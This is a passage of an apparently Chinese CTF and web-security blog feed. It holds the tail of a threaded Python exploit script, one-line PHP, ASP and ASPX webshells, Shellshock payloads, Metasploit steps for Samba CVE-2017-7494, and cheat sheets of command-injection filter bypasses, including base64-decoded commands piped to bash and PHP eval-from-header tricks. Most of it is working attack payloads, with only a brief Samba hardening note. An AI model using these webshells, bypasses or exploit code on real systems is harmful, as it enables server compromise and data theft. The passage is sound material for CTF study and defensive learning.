data-num=\"130\"></td><td><pre></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>    port<span class=\"token operator\">=</span><span class=\"token number\">80</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>        port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>    <span class=\"token keyword\">except</span> IndexError<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>        <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>    <span class=\"token keyword\">except</span> ValueError<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>        <span class=\"token keyword\">print</span> <span class=\"token string\">\"Error with port %d: %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>        sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"140\"></td><td><pre>    poolsz<span class=\"token operator\">=</span><span class=\"token number\">10</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>        poolsz <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>    <span class=\"token keyword\">except</span> IndexError<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>        <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>    <span class=\"token keyword\">except</span> ValueError<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>        <span class=\"token keyword\">print</span> <span class=\"token string\">\"Error with poolsz %d: %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>        sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>    <span class=\"token keyword\">print</span> <span class=\"token string\">\"Getting initial offset...\"</span><span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"150\"></td><td><pre>    reqphp<span class=\"token punctuation\">,</span> tag<span class=\"token punctuation\">,</span> reqlfi <span class=\"token operator\">=</span> setup<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>    offset <span class=\"token operator\">=</span> getOffset<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">,</span> reqphp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>    sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>flush<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>    maxattempts <span class=\"token operator\">=</span> <span class=\"token number\">1000</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>    e <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Event<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>    l <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Lock<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>    <span class=\"token keyword\">print</span> <span class=\"token string\">\"Spawning worker pool (%d)...\"</span> <span class=\"token operator\">%</span> poolsz</pre></td></tr><tr><td data-num=\"159\"></td><td><pre>    sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>flush<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>    tp <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>poolsz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>        tp<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>ThreadWorker<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>l<span class=\"token punctuation\">,</span>maxattempts<span class=\"token punctuation\">,</span> host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">,</span> reqphp<span class=\"token punctuation\">,</span> offset<span class=\"token punctuation\">,</span> reqlfi<span class=\"token punctuation\">,</span> tag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>    <span class=\"token keyword\">for</span> t <span class=\"token keyword\">in</span> tp<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>        t<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token keyword\">not</span> e<span class=\"token punctuation\">.</span>wait<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>            <span class=\"token keyword\">if</span> e<span class=\"token punctuation\">.</span>is_set<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>            <span class=\"token keyword\">with</span> l<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>                sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span> <span class=\"token string\">\"\\r% 4d / % 4d\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>counter<span class=\"token punctuation\">,</span> maxattempts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>                sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>flush<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>                <span class=\"token keyword\">if</span> counter <span class=\"token operator\">>=</span> maxattempts<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>                    <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>        <span class=\"token keyword\">print</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>        <span class=\"token keyword\">if</span> e<span class=\"token punctuation\">.</span>is_set<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>            <span class=\"token keyword\">print</span> <span class=\"token string\">\"Woot!  \\m/\"</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>            <span class=\"token keyword\">print</span> <span class=\"token string\">\":(\"</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>    <span class=\"token keyword\">except</span> KeyboardInterrupt<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre>        <span class=\"token keyword\">print</span> <span class=\"token string\">\"\\nTelling threads to shutdown...\"</span></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>        e<span class=\"token punctuation\">.</span><span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"185\"></td><td><pre>    <span class=\"token keyword\">print</span> <span class=\"token string\">\"Shuttin' down...\"</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre>    <span class=\"token keyword\">for</span> t <span class=\"token keyword\">in</span> tp<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>        t<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"188\"></td><td><pre></pre></td></tr><tr><td data-num=\"189\"></td><td><pre><span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre>    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "Web",
                "CTF_Web"
            ]
        },
        {
            "id": "http://yoursite.com/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/",
            "url": "http://yoursite.com/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/",
            "title": "文件上传漏洞",
            "date_published": "2024-03-26T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"文件上传漏洞\"><a class=\"anchor\" href=\"#文件上传漏洞\">#</a> 文件上传漏洞</h1>\n<p><strong>木马</strong></p>\n<ol>\n<li><code>&lt;?php phpinfo(); ?&gt;</code></li>\n<li><code>&lt;?php eval($_POST['a']); ?&gt;</code></li>\n<li><code>asp：&lt;%eval request (&quot;pass&quot;)%&gt;</code></li>\n<li><code>aspx： &lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</code></li>\n</ol>\n<p><strong>绕过手法</strong></p>\n<ol>\n<li>改可运行的其他后缀 (bp 抓包修改)  例如：phtml、php3</li>\n</ol>\n",
            "tags": [
                "Web",
                "文件上传"
            ]
        },
        {
            "id": "http://yoursite.com/Web/%E6%BC%8F%E6%B4%9E%E5%BA%93/",
            "url": "http://yoursite.com/Web/%E6%BC%8F%E6%B4%9E%E5%BA%93/",
            "title": "漏洞库",
            "date_published": "2024-03-26T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"apache-struts2\"><a class=\"anchor\" href=\"#apache-struts2\">#</a> Apache Struts2</h1>\n<h2 id=\"s2-066-cve-2023-50164\"><a class=\"anchor\" href=\"#s2-066-cve-2023-50164\">#</a> S2-066  CVE-2023-50164</h2>\n<p>控制上传参数导致目录穿越，若允许上传危险后缀文件 <code>例如JSP</code> ，，则可结合该目录穿越漏洞上传 webshell 至可解析目录，实现 RCE。Struts2 只要<strong>配置 action 和 filter</strong> 就能正常使用</p>\n<p><strong>影响范围</strong></p>\n<ul>\n<li>\n<p>2.5.0 &lt;= Apache Struts &lt;= 2.5.32</p>\n</li>\n<li>\n<p>6.0.0 &lt;= Apache Struts &lt;= 6.3.0</p>\n</li>\n</ul>\n<p><strong>原理</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamF2YXNlYy5vcmcvamF2YS12dWxzL1N0cnV0cy9TdHJ1dHMyLTUuaHRtbA==\">Struts2 漏洞调试总结</span></p>\n<h1 id=\"linux\"><a class=\"anchor\" href=\"#linux\">#</a> Linux</h1>\n<h2 id=\"bash-shellshock-cve-2014-6271\"><a class=\"anchor\" href=\"#bash-shellshock-cve-2014-6271\">#</a> Bash Shellshock  CVE-2014-6271</h2>\n<p>破壳漏洞</p>\n<p>调用 Bash Shell 之前可以用构造的值创建环境变量，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行 Shell 命令</p>\n<figure class=\"highlight plaintext\"><figcaption data-lang=\"plaintext\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“()&#123;”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</pre></td></tr></table></figure><p><strong>影响范围</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Gnu Bash:3.2 </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Gnu Bash:2.05:B </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Gnu Bash:3.0 </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Gnu Bash:1.14.5 </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Gnu Bash:1.14.6 </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Gnu Bash:3.0.16 </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Gnu Bash:1.14.7 </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Gnu Bash:2.0 </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Gnu Bash:2.01 </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Gnu Bash:2.01.1</pre></td></tr></table></figure><p><strong>payload</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">env</span> <span class=\"token assign-left variable\">x</span><span class=\"token operator\">=</span><span class=\"token string\">'() &#123; :;&#125;; echo shellshocked'</span> <span class=\"token function\">bash</span> –c <span class=\"token string\">\"echo hi\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>User-Agent: <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token builtin class-name\">:</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span class=\"token builtin class-name\">echo</span><span class=\"token punctuation\">;</span>/bin/cat /key.txt</pre></td></tr></table></figure><h2 id=\"samba-rce-cve-2017-7494\"><a class=\"anchor\" href=\"#samba-rce-cve-2017-7494\">#</a> Samba RCE  CVE-2017-7494</h2>\n<p>利用 smb 上的反弹 shell 漏洞实现 RCE</p>\n<p><strong>影响版本</strong></p>\n<ul>\n<li>\n<p>samba 3.5.0 到 4.6.4/4.5.10/4.4.14 的中间版本</p>\n</li>\n<li>\n<p>docker</p>\n</li>\n</ul>\n<p><strong>原理</strong></p>\n<p>Samba 允许连接一个远程的命名管道，并且在连接前会调用 <code>is_known_pipename()</code>  函数验证管道名称是否合法。在 <code>is_known_pipename()</code>  函数中，并没有检查管道名称中的特殊字符，加载了使用该名称的动态链接库。导致攻击者可以构造一个恶意的动态链接库文件，执行任意代码。</p>\n<p><strong>条件</strong></p>\n<ul>\n<li>\n<p>拥有共享文件写入权限，如：匿名可写等</p>\n</li>\n<li>\n<p>需要知道共享目录的物理路径</p>\n</li>\n</ul>\n<p><strong>payload</strong></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msfconsole</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>search is_know</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>user <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// use exploit/linux/samba/is_know_pipename</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>show options</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>set RHOST</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>set SMB_FOLDER <span class=\"token operator\">/</span>home<span class=\"token operator\">/</span>share  <span class=\"token comment\">// 目标可写的目录的绝对路径</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>exploit</pre></td></tr></table></figure><p><strong>系统加固</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">vim</span> /etc/samba/smb.conf</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>i</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Esc</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">76</span>行的位置，添加nt pipe support <span class=\"token operator\">=</span> no</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>:wq</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">service</span> smb restart</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">service</span> smb reload</pre></td></tr></table></figure>",
            "tags": [
                "Web",
                "Vulnerability"
            ]
        },
        {
            "id": "http://yoursite.com/Web/RCE%E6%BC%8F%E6%B4%9E/",
            "url": "http://yoursite.com/Web/RCE%E6%BC%8F%E6%B4%9E/",
            "title": "RCE漏洞",
            "date_published": "2024-03-26T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"rce漏洞\"><a class=\"anchor\" href=\"#rce漏洞\">#</a> RCE 漏洞</h1>\n<h1 id=\"命令\"><a class=\"anchor\" href=\"#命令\">#</a> 命令</h1>\n<p><code>system(&quot;whoami&quot;)</code> ， <code>system(&quot;ls&quot;)</code> ， <code>system(&quot;ls /&quot;)</code> ， <code>system(&quot;cat /flag&quot;)</code></p>\n<h1 id=\"绕过手法\"><a class=\"anchor\" href=\"#绕过手法\">#</a> 绕过手法</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>拼接法</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a<span class=\"token operator\">=</span>fl<span class=\"token punctuation\">;</span>b<span class=\"token operator\">=</span>ag<span class=\"token punctuation\">;</span>cat$IFS$a$b</pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>过滤空格</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>换行<span class=\"token operator\">%</span>0a<span class=\"token punctuation\">,</span>回车<span class=\"token operator\">%</span>0d<span class=\"token punctuation\">,</span>Tab<span class=\"token operator\">%</span><span class=\"token number\">09</span>（url传递）cat<span class=\"token operator\">%</span>09flag<span class=\"token punctuation\">.</span>php <span class=\"token operator\">/</span> system<span class=\"token operator\">%</span>0a<span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>$<span class=\"token punctuation\">&#123;</span>IFS<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>$IFS$<span class=\"token number\">9</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">&lt;></span>（cat<span class=\"token operator\">&lt;></span><span class=\"token operator\">/</span>flag）</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">&lt;</span>（cat<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>flag）</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span>cat<span class=\"token punctuation\">,</span><span class=\"token operator\">/</span>flag<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>过滤<span class=\"token operator\">/</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>采用多管道命令绕过</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token operator\">|</span><span class=\"token operator\">|</span>cd flag_is_here<span class=\"token punctuation\">;</span>cat flag_262431433226364<span class=\"token punctuation\">.</span>php</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>echo $<span class=\"token punctuation\">&#123;</span>PATH<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>过滤cat</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>替换<span class=\"token punctuation\">(</span>tac<span class=\"token punctuation\">,</span>more<span class=\"token punctuation\">,</span>bzmore<span class=\"token punctuation\">,</span>less<span class=\"token punctuation\">,</span>bzless<span class=\"token punctuation\">,</span>head<span class=\"token punctuation\">,</span>tail<span class=\"token punctuation\">,</span>nl<span class=\"token punctuation\">,</span>sed p<span class=\"token punctuation\">,</span>sort<span class=\"token punctuation\">,</span>uniq<span class=\"token punctuation\">,</span>rev<span class=\"token punctuation\">,</span>od<span class=\"token punctuation\">,</span>vim<span class=\"token punctuation\">,</span>vi<span class=\"token punctuation\">,</span>man<span class=\"token punctuation\">,</span>paste<span class=\"token punctuation\">,</span>grep <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">file</span> <span class=\"token operator\">-</span>f<span class=\"token punctuation\">,</span>dd <span class=\"token keyword\">if</span><span class=\"token operator\">=</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token operator\">/</span>f<span class=\"token operator\">*</span>即可</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>报错读取<span class=\"token punctuation\">(</span>URL编码<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>a<span class=\"token operator\">=</span>$<span class=\"token punctuation\">(</span>date <span class=\"token operator\">-</span>f <span class=\"token operator\">/</span>f<span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>echo $a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>有读取权限a<span class=\"token operator\">=</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span> <span class=\"token operator\">/</span>f<span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>echo $a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>有执行权限a<span class=\"token operator\">=</span>$<span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>f<span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>echo $a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>比较diff <span class=\"token operator\">/</span>f<span class=\"token operator\">*</span> <span class=\"token operator\">/</span>etc<span class=\"token operator\">/</span>passwd</pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>过滤flag文件名</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">/</span>f<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span><span class=\"token operator\">/</span>f???<span class=\"token punctuation\">,</span><span class=\"token operator\">/</span><span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token operator\">-</span>q<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token operator\">-</span>q<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token operator\">-</span>q<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token operator\">-</span>q<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>ca<span class=\"token string\">''</span> <span class=\"token operator\">/</span><span class=\"token string-interpolation\"><span class=\"token string\">f''</span></span>lag<span class=\"token punctuation\">,</span>cat\\t <span class=\"token operator\">/</span>f\\lag<span class=\"token punctuation\">,</span>cat<span class=\"token string\">\"\"</span> <span class=\"token operator\">/</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"\"</span></span>lag</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>cat <span class=\"token operator\">/</span><span class=\"token operator\">&amp;</span><span class=\"token string\">'\\146\\154\\141\\147'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>echo <span class=\"token string\">\"Y2F0IC9mKg==\"</span> <span class=\"token operator\">|</span> base64 <span class=\"token operator\">-</span>d<span class=\"token operator\">|</span>bash</pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>php无参<span class=\"token constant\">RCE</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">getenv</span><span class=\"token punctuation\">(</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token function\">getallheaders</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token function\">current</span><span class=\"token punctuation\">(</span><span class=\"token function\">get_defined_vars</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>jiang<span class=\"token operator\">=</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_id</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_id</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_id</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">readfile</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_id</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> 或者<span class=\"token function\">readgzfile</span><span class=\"token punctuation\">(</span><span class=\"token 